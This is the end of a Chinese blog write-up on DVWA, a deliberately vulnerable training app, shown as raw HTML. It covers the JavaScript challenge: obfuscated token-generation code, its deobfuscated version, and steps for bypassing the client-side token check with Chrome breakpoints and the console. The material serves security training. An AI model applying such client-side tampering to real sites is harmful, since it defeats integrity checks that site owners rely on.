(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;</span><span class=p>,</span><span class=s1>&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|evaltest|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;</span><span class=p>,</span><span class=s1>&#39;split&#39;</span><span class=p>];(</span><span class=kd>function</span><span class=p>(</span><span class=nx>c</span><span class=p>,</span><span class=nx>d</span><span class=p>){</span><span class=kd>var</span> <span class=nx>e</span><span class=o>=</span><span class=kd>function</span><span class=p>(</span><span class=nx>f</span><span class=p>){</span><span class=k>while</span><span class=p>(</span><span class=o>--</span><span class=nx>f</span><span class=p>){</span><span class=nx>c</span><span class=p>[</span><span class=s1>&#39;push&#39;</span><span class=p>](</span><span class=nx>c</span><span class=p>[</span><span class=s1>&#39;shift&#39;</span><span class=p>]());}};</span><span class=nx>e</span><span class=p>(</span><span class=o>++</span><span class=nx>d</span><span class=p>);}(</span><span class=nx>a</span><span class=p>,</span><span class=mh>0x1f4</span><span class=p>));</span><span class=kd>var</span> <span class=nx>b</span><span class=o>=</span><span class=kd>function</span><span class=p>(</span><span class=nx>c</span><span class=p>,</span><span class=nx>d</span><span class=p>){</span><span class=nx>c</span><span class=o>=</span><span class=nx>c</span><span class=o>-</span><span class=mh>0x0</span><span class=p>;</span><span class=kd>var</span> <span class=nx>e</span><span class=o>=</span><span class=nx>a</span><span class=p>[</span><span class=nx>c</span><span class=p>];</span><span class=k>return</span> <span class=nx>e</span><span class=p>;};</span><span class=nx>evaltest</span><span class=p>(</span><span class=kd>function</span><span class=p>(</span><span class=nx>d</span><span class=p>,</span><span class=nx>e</span><span class=p>,</span><span class=nx>f</span><span class=p>,</span><span class=nx>g</span><span class=p>,</span><span class=nx>h</span><span class=p>,</span><span class=nx>i</span><span class=p>){</span><span class=nx>h</span><span class=o>=</span><span class=kd>function</span><span class=p>(</span><span class=nx>j</span><span class=p>){</span><span class=k>return</span><span class=p>(</span><span class=nx>j</span><span class=p>&lt;</span><span class=nt>e</span><span class=err>?&#39;&#39;:</span><span class=na>h</span><span class=err>(</span><span class=na>parseInt</span><span class=err>(</span><span class=na>j</span><span class=err>/</span><span class=na>e</span><span class=err>)))+((</span><span class=na>j</span><span class=o>=</span><span class=na>j</span><span class=err>%</span><span class=na>e</span><span class=err>)</span><span class=p>&gt;</span><span class=mh>0x23</span><span class=o>?</span><span class=nb>String</span><span class=p>[</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x0&#39;</span><span class=p>)](</span><span class=nx>j</span><span class=o>+</span><span class=mh>0x1d</span><span class=p>)</span><span class=o>:</span><span class=nx>j</span><span class=p>[</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x1&#39;</span><span class=p>)](</span><span class=mh>0x24</span><span class=p>));};</span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=s1>&#39;&#39;</span><span class=p>[</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x2&#39;</span><span class=p>)](</span><span class=sr>/^/</span><span class=p>,</span><span class=nb>String</span><span class=p>)){</span><span class=k>while</span><span class=p>(</span><span class=nx>f</span><span class=o>--</span><span class=p>){</span><span class=nx>i</span><span class=p>[</span><span class=nx>h</span><span class=p>(</span><span class=nx>f</span><span class=p>)]</span><span class=o>=</span><span class=nx>g</span><span class=p>[</span><span class=nx>f</span><span class=p>]</span><span class=o>||</span><span class=nx>h</span><span class=p>(</span><span class=nx>f</span><span class=p>);}</span><span class=nx>g</span><span class=o>=</span><span class=p>[</span><span class=kd>function</span><span class=p>(</span><span class=nx>k</span><span class=p>){</span><span class=k>if</span><span class=p>(</span><span class=s1>&#39;wpA&#39;</span><span class=o>!==</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x3&#39;</span><span class=p>)){</span><span class=k>return</span> <span class=nx>i</span><span class=p>[</span><span class=nx>k</span><span class=p>];}</span><span class=k>else</span><span class=p>{</span><span class=k>while</span><span class=p>(</span><span class=nx>f</span><span class=o>--</span><span class=p>){</span><span class=nx>i</span><span class=p>[</span><span class=nx>k</span><span class=p>(</span><span class=nx>f</span><span class=p>)]</span><span class=o>=</span><span class=nx>g</span><span class=p>[</span><span class=nx>f</span><span class=p>]</span><span class=o>||</span><span class=nx>k</span><span class=p>(</span><span class=nx>f</span><span class=p>);}</span><span class=nx>g</span><span class=o>=</span><span class=p>[</span><span class=kd>function</span><span class=p>(</span><span class=nx>l</span><span class=p>){</span><span class=k>return</span> <span class=nx>i</span><span class=p>[</span><span class=nx>l</span><span class=p>];}];</span><span class=nx>k</span><span class=o>=</span><span class=kd>function</span><span class=p>(){</span><span class=k>return</span> <span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x4&#39;</span><span class=p>);};</span><span class=nx>f</span><span class=o>=</span><span class=mh>0x1</span><span class=p>;}}];</span><span class=nx>h</span><span class=o>=</span><span class=kd>function</span><span class=p>(){</span><span class=k>return</span> <span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x4&#39;</span><span class=p>);};</span><span class=nx>f</span><span class=o>=</span><span class=mh>0x1</span><span class=p>;};</span><span class=k>while</span><span class=p>(</span><span class=nx>f</span><span class=o>--</span><span class=p>){</span><span class=k>if</span><span class=p>(</span><span class=nx>g</span><span class=p>[</span><span class=nx>f</span><span class=p>]){</span><span class=k>if</span><span class=p>(</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x5&#39;</span><span class=p>)</span><span class=o>===</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x6&#39;</span><span class=p>)){</span><span class=k>return</span> <span class=nx>i</span><span class=p>[</span><span class=nx>h</span><span class=p>];}</span><span class=k>else</span><span class=p>{</span><span class=nx>d</span><span class=o>=</span><span class=nx>d</span><span class=p>[</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x2&#39;</span><span class=p>)](</span><span class=k>new</span> <span class=nb>RegExp</span><span class=p>(</span><span class=s1>&#39;\\x5cb&#39;</span><span class=o>+</span><span class=nx>h</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span><span class=o>+</span><span class=s1>&#39;\\x5cb&#39;</span><span class=p>,</span><span class=s1>&#39;g&#39;</span><span class=p>),</span><span class=nx>g</span><span class=p>[</span><span class=nx>f</span><span class=p>]);}}}</span><span class=k>return</span> <span class=nx>d</span><span class=p>;}(</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x7&#39;</span><span class=p>),</span><span class=mh>0x3e</span><span class=p>,</span><span class=mh>0x137</span><span class=p>,</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x8&#39;</span><span class=p>)[</span><span class=nx>b</span><span class=p>(</span><span class=s1>&#39;0x9&#39;</span><span class=p>)](</span><span class=s1>&#39;|&#39;</span><span class=p>),</span><span class=mh>0x0</span><span class=p>,{}));</span>  
</code></pre></td></tr></table></div></div><p>js被加密，解密：http://deobfuscatejavascript.com/#</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-jsx data-lang=jsx><span class=kd>function</span> <span class=nx>do_something</span><span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>  
    <span class=k>for</span> <span class=p>(</span><span class=kd>var</span> <span class=nx>t</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nx>n</span> <span class=o>=</span> <span class=nx>e</span><span class=p>.</span><span class=nx>length</span> <span class=o>-</span> <span class=mi>1</span><span class=p>;</span> <span class=nx>n</span> <span class=o>&gt;=</span> <span class=mi>0</span><span class=p>;</span> <span class=nx>n</span><span class=o>--</span><span class=p>)</span> <span class=nx>t</span> <span class=o>+=</span> <span class=nx>e</span><span class=p>[</span><span class=nx>n</span><span class=p>];</span>  
    <span class=k>return</span> <span class=nx>t</span>  
  
<span class=p>}</span>  
  
<span class=kd>function</span> <span class=nx>token_part_3</span><span class=p>(</span><span class=nx>t</span><span class=p>,</span> <span class=nx>y</span> <span class=o>=</span> <span class=s2>&#34;ZZ&#34;</span><span class=p>)</span> <span class=p>{</span>  
    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>sha256</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>+</span> <span class=nx>y</span><span class=p>)</span>  
<span class=p>}</span>  
  
<span class=kd>function</span> <span class=nx>token_part_2</span><span class=p>(</span><span class=nx>e</span> <span class=o>=</span> <span class=s2>&#34;YY&#34;</span><span class=p>)</span> <span class=p>{</span>  
    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>sha256</span><span class=p>(</span><span class=nx>e</span> <span class=o>+</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>)</span>  
<span class=p>}</span>  
  
<span class=kd>function</span> <span class=nx>token_part_1</span><span class=p>(</span><span class=nx>a</span><span class=p>,</span> <span class=nx>b</span><span class=p>)</span> <span class=p>{</span>  
    <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;token&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=nx>do_something</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;phrase&#34;</span><span class=p>).</span><span class=nx>value</span><span class=p>)</span>  
<span class=p>}</span>  
<span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;phrase&#34;</span><span class=p>).</span><span class=nx>value</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>  
<span class=nx>setTimeout</span><span class=p>(</span><span class=kd>function</span><span class=p>()</span> <span class=p>{</span>  
    <span class=nx>token_part_2</span><span class=p>(</span><span class=s2>&#34;XX&#34;</span><span class=p>)</span>  
<span class=p>},</span> <span class=mi>300</span><span class=p>);</span>  
<span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s2>&#34;send&#34;</span><span class=p>).</span><span class=nx>addEventListener</span><span class=p>(</span><span class=s2>&#34;click&#34;</span><span class=p>,</span> <span class=nx>token_part_3</span><span class=p>);</span>  
<span class=nx>token_part_1</span><span class=p>(</span><span class=s2>&#34;ABCD&#34;</span><span class=p>,</span> <span class=mi>44</span><span class=p>);</span>  
</code></pre></td></tr></table></div></div><p>大致原因是中间js<code>document.getElementById("phrase").value = "";</code>输入的内容被置空。可以借助chrome的调试器修改这个内容。具体操作方式见https://www.codenong.com/cs106723183/</p><p>就是在如下两处下断点：<br><img class=lazyload src=/svg/loading.min.svg data-src=/images/dvwa/26.png data-srcset="/images/dvwa/26.png, /images/dvwa/26.png 1.5x, /images/dvwa/26.png 2x" data-sizes=auto alt=/images/dvwa/26.png title=/images/dvwa/26.png><br>在console中输入<code>document.getElementById("phrase").value = "success";</code>修改值。</p><h2 id=参考链接>参考链接</h2><p><a href=https://www.freebuf.com/articles/web/274058.html>https://www.freebuf.com/articles/web/274058.html</a><br><a href=https://jckling.github.io/2020/04/23/Security/DVWA/2.%20Command%20Injection/>https://jckling.github.io/2020/04/23/Security/DVWA/2.%20Command%20Injection/</a><br><a href=https://segmentfault.com/a/1190000019484055>https://segmentfault.com/a/1190000019484055</a><br><a href=https://www.jianshu.com/p/ec2ca79e74b2>https://www.jianshu.com/p/ec2ca79e74b2</a></p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2022-04-02&nbsp;<a class=git-hash href=https://github.com/dillonzq/LoveIt/commit/7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e target=_blank title="commit by LinkleYping(1056669812@qq.com) 7b7305e20d8e1f8f67d9e59632ac1bfe266bb21e: init blog">
<i class="fas fa-hashtag fa-fw"></i>7b7305e</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=/dvwa/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://linkleyping.top/dvwa/ data-title="DVWA Writeup"><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://linkleyping.top/dvwa/><i class="fab fa-facebook-square fa-fw"></i></a><a href=javascript:void(0); title="分享到 Hacker News" data-sharer=hackernews data-url=https://linkleyping.top/dvwa/ data-title="DVWA Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="分享到 Line" data-sharer=line data-url=https://linkleyping.top/dvwa/ data-title="DVWA Writeup"><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@2.14.0/icons/line.svg></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://linkleyping.top/dvwa/ data-title="DVWA Writeup"><i class="fab fa-weibo fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags></section><section><span><a href=javascript:void(0); onclick=window.history.back();>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a 